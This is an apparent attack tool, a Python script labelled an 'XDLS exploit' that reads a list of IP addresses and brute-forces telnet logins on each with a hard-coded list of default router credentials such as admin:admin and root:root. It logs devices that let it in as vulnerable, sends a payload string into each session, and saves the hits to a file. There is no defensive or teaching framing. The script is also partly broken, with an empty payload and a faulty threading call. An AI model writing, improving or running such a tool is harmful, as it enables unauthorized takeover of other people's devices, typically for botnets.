import os,sys,time,random,socket,re,threading,telnetlib
from telnetlib import Telnet
# XDLS EXPLOIT REWRITTEN BY VSYNC, OPTIMISED AND BETTER.

try:
    listname        = str(sys.argv[1])
    outputFile      = (str(sys.argv[2]))
    if ".txt" not in listname:
        listname += ".txt"
except:
    print (f"Syntax : python3 {sys.argv[0]} listname.txt outputfile.txt")
    sys.exit()

Payload     = ""
vuln        = ""
dead        = ""
checkedIPS = []
for x in open(f"{listname}", "r"):
    x = x.strip("\n")
    print (f"[+] Added IP -> {x} to queue")
    os.system("clear")

class Exploit:
    def __init__(self) -> None:
        self.credentials = [
            "admin:admin",
            "root:root", 
            "root:admin",
            "admin:123",
            "unknown:unkown",
            "admin:1234",
            "ipbbx:ipbbx",
            "admin:telus",
            "user:user"
        ]
    
    def Exploiter() -> None:
        global Payload, listname, vuln, checkedIPS
        Credentials = Exploit().credentials
        for x in open (f"{listname}", "r"):
            x = x.strip("\r\n")
            ip      = x.strip().replace(":", " ").split()[0]
            if "/" in ip:
                print (" Please zmap your range. ")
                break
            if ip in checkedIPS:    pass
            try:    port    = (int(x.strip().replace(":", " ").split()[1]))
            except: port    = 23
            Sent = False 
            Tries = len(Credentials)
            for ff in range(0,len(Credentials)):
                try:
                    if Sent:    pass
                    else:
                        Username = Credentials[ff].strip().replace(":", " ").split()[0]
                        Password = Credentials[ff].strip().replace(":", " ").split()[1]
                        onSendPayload = telnetlib.Telnet(ip, timeout=2)
                        onSendPayload.read_until(b"Login:")
                        onSendPayload.read_until(b"Username:")
                        onSendPayload.write(Credentials[ff].strip().replace(":", " ").split()[0].encode('ascii') + b"\n")
                        onSendPayload.read_until(b"Password:")
                        onSendPayload.write(Credentials[ff].strip().replace(":", " ").split()[1].encode('ascii') + b"\n")
                        checkedIPS.append(ip)
                        if onSendPayload.read_until(b">"):  
                            print(f"[SSS] GOT ACCESS TO {x} --> [{Username}:{Password}]")
                            vuln += f"{ip}:{port} {Username}:{Password}\n"
                        else:
                            print(f"[RRR] Couldn't access {x}")
                            dead += f"{ip}:{port} {Username}:{Password}\n"
                        onSendPayload.write(Payload.encode('ascii') + b"\n")
                        print (f"[EXPLOITED] [{Username}:{Password} - > Sent",Credentials[ff].strip().replace(":", " ").split()[0].encode('ascii'),f" to {x}")
                except Exception as Error:
                    Username = Credentials[ff].strip().replace(":", " ").split()[0]
                    Password = Credentials[ff].strip().replace(":", " ").split()[1]
                    print(f"[RETRYING] [{Username}:{Password}] - > {x} was invalid, passing ! -> {Error}")
                    try:    onSendPayload.close()
                    except: continue
                    pass
            try:    onSendPayload.close()
            except: continue
            pass
        print (f"[+] Finished bruting {len(vuln)+len(dead)} devices with {vuln} being vulnerable and {dead} being dead. ")
    
    def SaveVulnerableDevices() -> None:
        global vuln
        with open("vuln.txt", "a+") as SaveVULN:
            SaveVULN.write(f"{vuln}")
        return True
    

if __name__ == '__main__':
    if input(" Threads ? (y/n) ").upper() == "Y" or input(" Threads ? (y/n) ").upper() == "YES":
        for l in range(50):
            try:
                t = threading.Thread(target=Exploit.Exploiter())
                t.start()
            except:
                pass
    else:   Exploit.Exploiter()
    if Exploit.SaveVulnerableDevices(): print (" Success . ")
    sys.exit()
